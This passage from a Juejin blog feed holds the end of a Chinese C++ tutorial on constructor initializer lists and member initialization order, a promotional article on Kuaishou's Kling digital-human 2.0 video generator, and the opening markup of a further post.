    <span class="hljs-built_in">PerformanceDemo</span>(<span class="hljs-type">const</span> std::string&amp; s) : <span class="hljs-built_in">data</span>(s) { }
    <span class="hljs-comment">// 只执行一次：直接拷贝构造</span>
};
</code></pre>
<h3 data-id="heading-12">4.2 性能影响的实际测试</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 创建10000个对象的时间对比：</span>
<span class="hljs-comment">// 使用初始化列表：185ms</span>
<span class="hljs-comment">// 构造函数内赋值：245ms</span>
<span class="hljs-comment">// 性能提升约24.5%</span>
</code></pre>
<h2 data-id="heading-13">五、初始化顺序的重要规则</h2>
<h3 data-id="heading-14">5.1 顺序由声明顺序决定</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderMatters</span> {
    <span class="hljs-type">int</span> x;    <span class="hljs-comment">// 声明1</span>
    <span class="hljs-type">int</span> y;    <span class="hljs-comment">// 声明2</span>
    <span class="hljs-type">int</span> z;    <span class="hljs-comment">// 声明3</span>
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 初始化列表顺序：z, x, y</span>
    <span class="hljs-comment">// 但实际执行顺序：x → y → z（声明顺序！）</span>
    <span class="hljs-built_in">OrderMatters</span>() : <span class="hljs-built_in">z</span>(<span class="hljs-number">10</span>), <span class="hljs-built_in">x</span>(<span class="hljs-number">20</span>), <span class="hljs-built_in">y</span>(<span class="hljs-number">30</span>) { }
};
</code></pre>
<h3 data-id="heading-15">5.2 顺序不一致的陷阱</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dangerous</span> {
    <span class="hljs-type">int</span> a;
    <span class="hljs-type">int</span> b;
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// ❌ 危险的初始化顺序</span>
    <span class="hljs-built_in">Dangerous</span>(<span class="hljs-type">int</span> val) : <span class="hljs-built_in">b</span>(val), <span class="hljs-built_in">a</span>(b * <span class="hljs-number">2</span>) {
        <span class="hljs-comment">// 实际执行：a先初始化（使用未初始化的b！）</span>
        <span class="hljs-comment">// b后初始化为val</span>
        <span class="hljs-comment">// 结果是未定义行为！</span>
    }
    
    <span class="hljs-comment">// ✅ 正确的初始化顺序</span>
    <span class="hljs-built_in">Dangerous</span>(<span class="hljs-type">int</span> val) : <span class="hljs-built_in">a</span>(val * <span class="hljs-number">2</span>), <span class="hljs-built_in">b</span>(val) {
        <span class="hljs-comment">// 执行顺序：a → b，都使用val初始化</span>
    }
};
</code></pre>
<h2 data-id="heading-16">六、最佳实践指南</h2>
<h3 data-id="heading-17">6.1 总是使用初始化列表</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ✅ 推荐：初始化所有成员</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BestPractice</span> {
    <span class="hljs-type">const</span> <span class="hljs-type">int</span> id;
    std::string name;
    <span class="hljs-type">int</span> age;
    std::vector&lt;<span class="hljs-type">double</span>&gt; scores;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">BestPractice</span>(<span class="hljs-type">int</span> i, <span class="hljs-type">const</span> std::string&amp; n, <span class="hljs-type">int</span> a, <span class="hljs-type">const</span> std::vector&lt;<span class="hljs-type">double</span>&gt;&amp; s)
        : <span class="hljs-built_in">id</span>(i)        <span class="hljs-comment">// const成员</span>
        , <span class="hljs-built_in">name</span>(n)      <span class="hljs-comment">// 类类型</span>
        , <span class="hljs-built_in">age</span>(a)       <span class="hljs-comment">// 基本类型</span>
        , <span class="hljs-built_in">scores</span>(s) {  <span class="hljs-comment">// 容器类</span>
        <span class="hljs-comment">// 所有成员都已正确初始化</span>
    }
};
</code></pre>
<h3 data-id="heading-18">6.2 保持声明顺序与初始化顺序一致</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WellStructured</span> {
    <span class="hljs-comment">// 1. 按逻辑分组声明成员</span>
    <span class="hljs-type">const</span> <span class="hljs-type">int</span> id;          <span class="hljs-comment">// 常量在前</span>
    std::string name;      <span class="hljs-comment">// 然后是主要数据成员</span>
    
    <span class="hljs-comment">// 2. 相关成员放在一起</span>
    <span class="hljs-type">int</span> age;
    <span class="hljs-type">double</span> salary;
    
    <span class="hljs-comment">// 3. 辅助成员在后</span>
    <span class="hljs-keyword">mutable</span> <span class="hljs-type">int</span> accessCount;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">WellStructured</span>(<span class="hljs-type">int</span> i, <span class="hljs-type">const</span> std::string&amp; n, <span class="hljs-type">int</span> a, <span class="hljs-type">double</span> s)
        : <span class="hljs-built_in">id</span>(i)           <span class="hljs-comment">// 与声明顺序一致</span>
        , <span class="hljs-built_in">name</span>(n)
        , <span class="hljs-built_in">age</span>(a)
        , <span class="hljs-built_in">salary</span>(s)
        , <span class="hljs-built_in">accessCount</span>(<span class="hljs-number">0</span>) {  <span class="hljs-comment">// 辅助成员最后</span>
    }
};
</code></pre>
<h3 data-id="heading-19">6.3 基本类型也要初始化</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CompleteInitialization</span> {
    <span class="hljs-type">int</span> width;     <span class="hljs-comment">// 基本类型</span>
    <span class="hljs-type">int</span> height;    <span class="hljs-comment">// 基本类型</span>
    std::string title;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// ✅ 即使基本类型也明确初始化</span>
    <span class="hljs-built_in">CompleteInitialization</span>(<span class="hljs-type">int</span> w, <span class="hljs-type">int</span> h, <span class="hljs-type">const</span> std::string&amp; t)
        : <span class="hljs-built_in">width</span>(w), <span class="hljs-built_in">height</span>(h), <span class="hljs-built_in">title</span>(t) { }
    
    <span class="hljs-comment">// ❌ 避免未初始化</span>
    <span class="hljs-built_in">CompleteInitialization</span>(<span class="hljs-type">const</span> std::string&amp; t) : <span class="hljs-built_in">title</span>(t) {
        <span class="hljs-comment">// width和height是随机值！</span>
    }
};
</code></pre>
<h2 data-id="heading-20">七、常见问题解答</h2>
<h3 data-id="heading-21">Q1：为什么我的代码没有编译错误？</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
    std::string name;
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">Example</span>(<span class="hljs-type">const</span> std::string&amp; n) {
        name = n;  <span class="hljs-comment">// 不会编译错误！</span>
    }
};
</code></pre>
<p><strong>A</strong>：对于有默认构造函数的类（如<code>std::string</code>），构造函数内赋值是合法的，但<strong>性能较低</strong>。</p>
<h3 data-id="heading-22">Q2：什么时候会真正编译错误？</h3>
<p><strong>A</strong>：当类成员<strong>没有默认构造函数</strong>且<strong>不在初始化列表中</strong>时：</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NoDefault</span> { <span class="hljs-built_in">NoDefault</span>(<span class="hljs-type">int</span>); };
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> { NoDefault obj; };
<span class="hljs-built_in">Example</span>() { }  <span class="hljs-comment">// 编译错误！</span>
</code></pre>
<h3 data-id="heading-23">Q3：委托构造函数如何使用初始化列表？</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    std::string name;
    <span class="hljs-type">int</span> age;
    std::string address;
    
<span class="hljs-keyword">public</span>:
    <span class="hljs-comment">// 委托构造函数</span>
    <span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> std::string&amp; n, <span class="hljs-type">int</span> a)
        : <span class="hljs-built_in">Person</span>(n, a, <span class="hljs-string">"Unknown"</span>) { }  <span class="hljs-comment">// 委托给三参数版本</span>
    
    <span class="hljs-built_in">Person</span>(<span class="hljs-type">const</span> std::string&amp; n, <span class="hljs-type">int</span> a, <span class="hljs-type">const</span> std::string&amp; addr)
        : <span class="hljs-built_in">name</span>(n), <span class="hljs-built_in">age</span>(a), <span class="hljs-built_in">address</span>(addr) { }
};
</code></pre>
<h2 data-id="heading-24">八、核心原则</h2>
<ol>
<li><strong>初始化 ≠ 赋值</strong>：初始化列表是真正的初始化，构造函数体内的是赋值</li>
<li><strong>所有成员都会初始化</strong>：无论是否在列表中，都会在进入构造函数体前初始化</li>
<li><strong>顺序很重要</strong>：初始化顺序只取决于声明顺序</li>
<li><strong>一致性是关键</strong>：总是使用初始化列表初始化所有成员</li>
<li><strong>性能很重要</strong>：对于类类型，直接初始化比默认构造+赋值更高效</li>
</ol>
<h2 data-id="heading-25">九、最后的建议</h2>
<p>养成使用初始化列表的习惯，即使对于基本类型也是如此。这不仅是良好的编程风格，还能：</p>
<ul>
<li>避免未初始化变量</li>
<li>提高代码性能</li>
<li>确保const和引用成员正确初始化</li>
<li>使代码更易维护和理解</li>
</ul>
<p>记住：<strong>在C++中，初始化总是优于赋值</strong>。掌握初始化列表的使用，是成为高效C++程序员的重要一步。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[快手可灵2.0炸场：告别面瘫机器人，你的JPG照片现在能拿奥斯卡了]]></title>    <link>https://juejin.cn/post/7580373352420311066</link>    <guid>https://juejin.cn/post/7580373352420311066</guid>    <pubDate>2025-12-06T15:32:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580373352420311066" data-draft-id="7580374090364682278" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="快手可灵2.0炸场：告别面瘫机器人，你的JPG照片现在能拿奥斯卡了"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2025-12-06T15:32:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨风如雪"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            快手可灵2.0炸场：告别面瘫机器人，你的JPG照片现在能拿奥斯卡了
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨风如雪
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T15:32:56.000Z" title="Sat Dec 06 2025 15:32:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>说实话，在此之前，我对所谓的“数字人”一直是持保留态度的。</p>
<p>你肯定也见过那种视频：一张僵硬的脸，嘴巴机械地一张一合，眼神空洞得像是在念稿子。那种东西，与其叫“数字人”，不如叫“对口型机器”。但在2025年12月4日，快手可灵AI把这个定义彻底改写了。</p>
<p>可灵数字人2.0正式全量上线。这次更新最让我感到兴奋的，不是什么复杂的参数堆砌，而是一个非常感性的变化：<strong>它终于从“会说话”，进化到了“会表演”。</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2Fasfdv-1024x455.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/asfdv-1024x455.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/86ffcf4ae2a64d0eb5c36a45a15420a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765639975&amp;x-signature=9uUSonGfrZDaZaw0XggiUhB1Ggo%3D" alt="asfdv" loading="lazy"/></a></p>
<h3 data-id="heading-0">给AI装上“导演思维”</h3>
<p>以前的数字人技术，很多时候是听不懂人话的。你给它一段悲伤的音频，它可能还是瞪着大眼睛在那儿念词。</p>
<p>但这次可灵2.0引入了一个叫做“多模态导演模块”（MLLM Director）的东西。听起来很技术流，但其实很好理解：它就像是在后台因聘请了一位看不见的导演。</p>
<p>当你上传一张照片和一段音频后，这位“AI导演”不仅会分析你在说什么，还会分析你的语气、节奏，甚至是你输入的文本提示。</p>
<p>比如，你输入一段快节奏的说唱，或者一首深情的慢歌，以前的模型可能只是嘴巴动得快一点。但现在，模型会自动提取音频里的“情感轨迹”。于是你会看到，屏幕里的那个数字人，眉毛会随着高音扬起，肩膀会随着鼓点耸动，甚至眼神里能流露出笑意或愤怒。</p>
<p>这种连贯的肢体语言和微表情，才是打破“恐怖谷效应”的关键。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2FiShot_2025-12-06_23.24.08-1024x600.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/iShot_2025-12-06_23.24.08-1024x600.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31df6565af5040ae9c5d17435dd5c8d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765639975&amp;x-signature=Z%2BTSmnE%2BS1fs6By6Vf4CezXsc5A%3D" alt="iShot_2025-12-06_23.24.08" loading="lazy"/></a></p>
<h3 data-id="heading-1">五分钟的大片，三步搞定</h3>
<p>对于内容创作者来说，这次升级最实用的点在于“量”的突破。</p>
<p>以前很多工具只能生成几十秒的片段，稍微长一点就崩坏。可灵2.0直接支持最长 <strong>5分钟</strong> 的视频生成，而且是1080p的高清画质。这意味着什么？意味着你不需要再去拼凑碎片，完全可以一镜到底地做完一个完整的短剧、一个MV，或者一节完整的微课。</p>
<p>更离谱的是它的操作门槛。我原本以为要调整这么多复杂的表情动作，后台界面得像飞机的仪表盘一样复杂。结果快手把它做成了“傻瓜式”的三步走：</p>
<ol>
<li><strong>甩一张图</strong>：真人照片、卡通角色、甚至是你生成的AI美女帅哥，扔进去就行。</li>
<li><strong>给声音</strong>：上传录音，或者打字让AI帮你读。</li>
<li><strong>提要求</strong>：这是最关键的一步。你可以像跟演员讲戏一样，输入文本描述。比如“镜头缓慢推进，角色表现出难以置信的表情，手捂住胸口”。</li>
</ol>
<p>剩下的，就交给那个“AI导演”去算吧。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2Fasfasf.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/asfasf.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b06e639e4efd4025ad58be065137ff4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765639975&amp;x-signature=QKDLy4omctZ8Uge3c0qXNAXvNcM%3D" alt="asfasf" loading="lazy"/></a></p>
<h3 data-id="heading-2">这对我们意味着什么？</h3>
<p>这项技术的落地，实际上是在重塑内容创作的成本结构。</p>
<p>想象一下，你是一个做电商的。以前你要拍一个产品介绍视频，得找模特、租棚子、打光、拍摄、剪辑，折腾一天几千块没了。现在，你只需要一张模特图，一段介绍产品的录音，几分钟就能生成一个多语种的、表情生动的产品演示视频。</p>
<p>或者你是一个音乐人，写了歌却没钱拍MV。现在你可以生成一个充满赛博朋克风格的角色，让它在视频里深情演唱，手势和口型还能精准卡在节拍上。</p>
<p>甚至在教育领域，那个永远不知疲倦、始终保持微笑、还能配合手势讲解知识点的“虚拟老师”，现在看来已经触手可及。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2025%2F12%2Fsadacvv.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2025/12/sadacvv.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3e129b51bc8e423c89e17a05eb862063~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765639975&amp;x-signature=TxVSyRj%2BXhmYzVS0QBWssvmr2%2Fk%3D" alt="sadacvv" loading="lazy"/></a></p>
<h3 data-id="heading-3">结语</h3>
<p>我们常说AI的发展是一场长跑，但快手可灵这次的更新，更像是一次百米冲刺。它解决的不再是“能不能动”的问题，而是“动得像不像人”的问题。</p>
<p>如果你手里也有一些想让它“活过来”的照片，或者有一些一直没能拍出来的剧本，不妨去试试。毕竟，在这个时代，每个人都可以是导演，而你的演员，已经在云端就位了。</p>
<p><strong>如果你也对最新的AI信息感兴趣或者有疑问 都可以加入我的大家庭 第一时间分享最新AI资讯、工具、教程、文档 欢迎你的加入！！！😉😉😉</strong></p>
<p>公众号：墨风如雪小站</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI 界的“USB-C”协议来了：让你的 AI 拥有即插即用的“手和脚”]]></title>    <link>https://juejin.cn/post/7580277964342083594</link>    <guid>https://juejin.cn/post/7580277964342083594</guid>    <pubDate>2025-12-06T14:05:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580277964342083594" data-draft-id="7580303864604950537" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI 界的“USB-C”协议来了：让你的 AI 拥有即插即用的“手和脚”"/> <meta itemprop="keywords" content="OpenAI,AI编程,AIGC"/> <meta itemprop="datePublished" content="2025-12-06T14:05:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="泯泷"/> <meta itemprop="url" content="https://juejin.cn/user/317122698296024"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI 界的“USB-C”协议来了：让你的 AI 拥有即插即用的“手和脚”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/317122698296024/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    泯泷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T14:05:18.000Z" title="Sat Dec 06 2025 14:05:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 